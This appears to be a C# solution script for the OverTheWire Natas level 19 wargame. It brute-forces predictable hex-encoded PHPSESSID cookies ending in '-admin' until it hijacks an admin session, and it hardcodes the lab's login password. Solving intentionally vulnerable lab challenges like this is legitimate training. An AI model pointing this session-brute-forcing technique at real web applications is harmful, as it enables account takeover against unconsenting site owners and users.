using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace natas19
{
    class Program
    {
        static void Main(string[] args)
        {
            Task t = new Task(Force);
            t.Start();
            Console.ReadLine();

        }
        static async void Force()
        {
            string login = "natas19";
            string pass = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs";
            string url = "http://natas19.natas.labs.overthewire.org";

            HttpClientHandler handler = new HttpClientHandler();
            handler.Credentials = new NetworkCredential(login, pass);
            var cookieContainer = new CookieContainer();
            handler.CookieContainer = cookieContainer;
            HttpClient client = new HttpClient(handler);

            for (int i = 0; i < 641; i++)
            {
                //var buff =("-admin");
                var ba = Encoding.Default.GetBytes("-admin");
                var adminhex = BitConverter.ToString(ba);
                adminhex = adminhex.Replace("-", "");
                adminhex = adminhex.ToLower();

                var hex1 = Encoding.Default.GetBytes(""+i);
                var hex = BitConverter.ToString(hex1);
                hex = hex.Replace("-", "");
                hex = hex.ToLower();

                var values = new Dictionary<string, string>
                {
                    {"PHPSESSID",""+hex+adminhex+""},
                };
                

                cookieContainer.Add(new Uri(url), new Cookie("PHPSESSID", "" + hex + adminhex + ""));

                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(url, content);
                var allContent = await response.Content.ReadAsStringAsync();

                //Console.WriteLine("{0}", allContent);
                if (i % 10 == 0)
                {
                    Console.WriteLine("Sesion number: {0}", i);
                }
                if (allContent.Contains("You are an admin"))
                {
                    var index = allContent.IndexOf("Username");
                    var password = allContent.Substring(index, 42 + 18);
                    //Console.WriteLine("{0}", allContent);
                    Console.WriteLine("Finally sesion: {0}", i);
                    Console.WriteLine("{0}", password);
                    break;
                }
            }
        }
    }
}
